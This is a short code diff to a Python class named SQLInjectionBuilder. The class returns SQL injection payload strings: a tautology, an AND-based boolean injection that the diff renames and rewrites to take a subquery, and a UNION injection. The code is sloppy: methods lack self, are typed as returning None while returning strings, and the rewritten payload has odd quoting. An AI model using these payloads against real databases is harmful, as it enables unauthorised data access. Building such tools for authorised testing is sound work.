@@ -8,11 +8,11 @@ class SQLInjectionBuilder:
         """
         return f"\' OR 1='1; -- "
 
-    def and_boolean_injection(condition: str) -> None:
+    def false_and_boolean_injection(subquery: str) -> None:
         """
         Useful for database checks and using another query
         """
-        return f"\' AND {condition}; -- "
+        return f"\' AND 1=\"2\" {subquery}"
 
     def union_injection(subquery: str) -> None:
         return f"UNION {subquery} -- "
